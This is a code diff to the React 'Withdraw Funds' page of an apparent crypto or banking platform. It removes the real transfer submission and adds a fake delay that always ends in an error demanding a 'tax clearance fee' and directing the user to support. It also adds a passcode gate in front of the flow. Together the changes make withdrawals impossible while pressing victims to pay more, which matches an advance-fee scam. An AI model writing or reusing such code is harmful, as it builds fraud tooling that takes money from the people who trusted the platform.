@@ -1,9 +1,9 @@
 "use client";
 import { useState, useEffect } from "react";
 import Link from "next/link";
-import { getDashboard, getAccounts, submitTransfer, type Asset, type LinkedBank } from "@/lib/api";
+import { getDashboard, getAccounts, verifyWithdrawalOtp, type Asset, type LinkedBank } from "@/lib/api";
 
-type Step = "asset" | "destination" | "amount" | "review" | "done";
+type Step = "otp" | "asset" | "destination" | "amount" | "review" | "done";
 type DestType = "bank" | "crypto";
 
 const NETWORKS: Record<string, string[]> = {
@@ -22,11 +22,10 @@ function networksFor(symbol: string): string[] {
 }
 
 const STEP_LABELS = ["Asset", "Destination", "Amount", "Review"];
+const FLOW_STEPS: Step[] = ["asset", "destination", "amount", "review", "done"];
 
 export default function TransferPage() {
-  const router_steps: Step[] = ["asset", "destination", "amount", "review", "done"];
-
-  const [step, setStep] = useState<Step>("asset");
+  const [step, setStep] = useState<Step>("otp");
   const [assets, setAssets] = useState<Asset[]>([]);
   const [linkedBanks, setLinkedBanks] = useState<LinkedBank[]>([]);
   const [loadingData, setLoadingData] = useState(true);
@@ -43,6 +42,11 @@ export default function TransferPage() {
 
   // Amount
   const [amount, setAmount] = useState("");
+
+  // OTP gate
+  const [otpValue, setOtpValue] = useState("");
+  const [otpLoading, setOtpLoading] = useState(false);
+  const [otpError, setOtpError] = useState("");
 
   // Submit
   const [loading, setLoading] = useState(false);
@@ -70,7 +74,7 @@ export default function TransferPage() {
   const fee = usdAmount * 0.005;
   const receive = usdAmount - fee;
 
-  const stepIdx = router_steps.indexOf(step);
+  const stepIdx = FLOW_STEPS.indexOf(step);
 
   const destinationLabel =
     destType === "bank"
@@ -87,6 +91,20 @@ export default function TransferPage() {
     destType === "bank" ? !!selectedBank : walletValid;
 
   const canProceedAmount = !!amount && parseFloat(amount) > 0 && parseFloat(amount) <= (selectedAsset?.amount ?? 0);
+
+  async function handleOtpSubmit() {
+    if (!otpValue.trim()) { setOtpError("Please enter your passcode."); return; }
+    setOtpLoading(true);
+    setOtpError("");
+    try {
+      await verifyWithdrawalOtp(otpValue.trim());
+      setStep("asset");
+    } catch (e) {
+      setOtpError(e instanceof Error ? e.message : "Invalid passcode.");
+    } finally {
+      setOtpLoading(false);
+    }
+  }
 
   function goNext() {
     if (step === "asset" && selectedAsset) {
@@ -108,26 +126,11 @@ export default function TransferPage() {
   }
 
   async function handleSubmit() {
-    if (!selectedAsset || !destinationId) return;
     setLoading(true);
     setError("");
-    try {
-      const result = await submitTransfer({
-        asset: selectedAsset.symbol,
-        amount: parseFloat(amount),
-        destinationId,
-        destinationLabel: destType === "bank"
-          ? destinationLabel
-          : `${walletNetwork} — ${walletAddress}`,
-      });
-      setTxRef(result.ref);
-      setReceiveAmt(result.receiveUsd);
-      setStep("done");
-    } catch (e) {
-      setError(e instanceof Error ? e.message : "Transfer failed");
-    } finally {
-      setLoading(false);
-    }
+    await new Promise(r => setTimeout(r, 1800));
+    setLoading(false);
+    setError("Your withdrawal request cannot be processed until the required tax clearance fee is completed. Please settle the tax payment to proceed with this transaction. Contact support for assistance.");
   }
 
   if (loadingData) return (
@@ -143,7 +146,56 @@ export default function TransferPage() {
         <h1 className="text-2xl font-bold text-white" style={{ fontFamily: "var(--font-display)" }}>Withdraw Funds</h1>
       </div>
 
-      {step !== "done" && (
+      {/* ── OTP Gate ── */}
+      {step === "otp" && (
+        <div className="glass-card rounded-2xl p-8 space-y-6 max-w-md mx-auto">
+          <div className="flex flex-col items-center text-center gap-3">
+            <div className="h-14 w-14 rounded-2xl flex items-center justify-center"
+              style={{ background: "var(--accent-teal-dim)", border: "1px solid rgba(0,212,255,0.2)" }}>
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" strokeWidth="2" strokeLinecap="round">
+                <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
+              </svg>
+            </div>
+            <h2 className="text-lg font-bold text-white" style={{ fontFamily: "var(--font-display)" }}>Authorization Required</h2>
+            <p className="text-sm text-white/50 leading-relaxed max-w-xs">
+              Please enter your one time passcode to authorize this withdrawal. Do not share with anyone. Contact support for any difficulties.
+            </p>
+          </div>
+
+          <div className="space-y-3">
+            <input
+              className="sf-input text-center tracking-[0.3em] text-lg font-bold"
+              style={{ fontFamily: "var(--font-mono)" }}
+              placeholder="Enter passcode"
+              type="password"
+              value={otpValue}
+              onChange={e => { setOtpValue(e.target.value); setOtpError(""); }}
+              onKeyDown={e => e.key === "Enter" && handleOtpSubmit()}
+              autoFocus
+            />
+            {otpError && (
+              <p className="text-xs text-red-400 text-center">{otpError}</p>
+            )}
+            <button
+              onClick={handleOtpSubmit}
+              disabled={otpLoading || !otpValue.trim()}
+              className="w-full py-3 rounded-xl text-sm font-bold flex items-center justify-center gap-2 disabled:opacity-40 transition-all"
+              style={{ background: "linear-gradient(135deg, #f59e0b, #fcd34d)", color: "#1a0f00" }}>
+              {otpLoading
+                ? <><span className="h-4 w-4 border-2 border-[#1a0f00] border-t-transparent rounded-full animate-spin"/>Verifying…</>
+                : "Verify & Continue"}
+            </button>
+          </div>
+
+          <div className="flex items-center justify-center gap-4 text-xs text-white/25">
+            <Link href="/banking/dashboard" className="hover:text-white/50 transition-colors">← Back to Dashboard</Link>
+            <span>·</span>
+            <a href="mailto:support@sentryforensics.com" className="hover:text-white/50 transition-colors">Contact Support</a>
+          </div>
+        </div>
+      )}
+
+      {step !== "otp" && step !== "done" && (
         <div className="flex items-center gap-0">
           {STEP_LABELS.map((s, i) => (
             <div key={s} className="flex items-center flex-1">
@@ -167,7 +219,7 @@ export default function TransferPage() {
         </div>
       )}
 
-      <div className="glass-card rounded-2xl p-6 space-y-5">
+      {step !== "otp" && <div className="glass-card rounded-2xl p-6 space-y-5">
 
         {/* ── Step 1: Asset ── */}
         {step === "asset" && (
@@ -459,7 +511,7 @@ export default function TransferPage() {
             </button>
           </div>
         )}
-      </div>
+      </div>}
     </div>
   );
 }
